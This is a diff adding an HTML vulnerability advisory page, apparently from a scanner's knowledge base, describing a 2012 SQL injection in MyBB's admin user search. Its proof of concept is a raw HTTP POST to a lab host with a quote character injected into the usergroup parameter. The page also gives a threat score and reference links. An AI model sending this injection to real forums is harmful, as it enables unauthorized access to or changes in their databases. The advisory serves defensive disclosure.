@@ -1,0 +1,229 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/m.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">MyBB ‘index.php’  SQL注入漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									MyBB是一款流行的Web论坛程序。
+<br />
+
+<br />
+
+									MyBB在实现上存在SQL注入漏洞，利用这些漏洞可允许攻击者执行任意脚本代码、窃取cookie验证凭证、控制应用、访问或修改数据。
+<br />
+
+<br />
+
+									SQL-injection漏洞证明:
+<br />
+
+<br />
+
+									POST /mybb/admin/index.php?module=user-users&amp;action=search HTTP/1.1
+<br />
+
+									Host: 192.168.7.5
+<br />
+
+									User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:10.0) Gecko/20100101 Firefox/10.0
+<br />
+
+									Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<br />
+
+									Accept-Language: en-us,en;q=0.5
+<br />
+
+									Accept-Encoding: gzip, deflate
+<br />
+
+									Proxy-Connection: keep-alive
+<br />
+
+									Referer: http://192.168.7.5/mybb/admin/index.php?module=user-users&amp;action=search
+<br />
+
+									Cookie: mybb[lastvisit]=1332694756; mybb[lastactive]=1332699650; mybb[referrer]=1; loginattempts=1;
+<br />
+
+									adminsid=a82d27dd72efdb0a99c009db7701e847; acploginattempts=0; mybbuser=1_CAo7pz2wUvHGtlJht9OLGyXG8ZVbS78xAXx6ZTzBrvNSe5S2GM;
+<br />
+
+									sid=d725ac10b7d8f0f8765dfa73f5dcf23b
+<br />
+
+									Content-Type: application/x-www-form-urlencoded
+<br />
+
+									Content-Length: 638
+<br />
+
+<br />
+
+									my_post_key=5dbe489b5b03d9d9e2d387ff9267567d&amp;conditions%5Busername%5D=aditya&amp;conditions%5Bemail%5D=aditya
+<br />
+
+									&amp;conditions%5Busergroup%5D%5B%5D=2&#39;&amp;conditions%5Bwebsite%5D=&amp;conditions%5Bicq%5D=&amp;conditions%5Baim%5D=
+<br />
+
+									&amp;conditions%5Byahoo%5D=&amp;conditions%5Bmsn%5D=&amp;conditions%5Bsignature%5D=&amp;conditions%5Busertitle%5D=
+<br />
+
+									&amp;conditions%5Bpostnum_dir%5D=greater_than&amp;conditions%5Bpostnum%5D=&amp;conditions%5Bregdate%5D=
+<br />
+
+									&amp;conditions%5Bregip%5D=&amp;conditions%5Blastip%5D=&amp;conditions%5Bpostip%5D=&amp;profile_fields%5Bfid3%5D%5Bfid3%5D=N%2FA
+<br />
+
+									&amp;profile_fields%5Bfid1%5D=&amp;profile_fields%5Bfid2%5D=&amp;sortby=username&amp;order=asc&amp;perpage=&amp;displayas=card<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									厂商补丁：
+<br />
+
+<br />
+
+									MyBB
+<br />
+
+									----
+<br />
+
+									目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：
+<br />
+
+<br />
+
+									http://www.mybboard.com/<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>6</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2012-03-27</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2012-04-08</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/52743" target="_blank">52743</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=19270" target="_blank">19270</a>
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
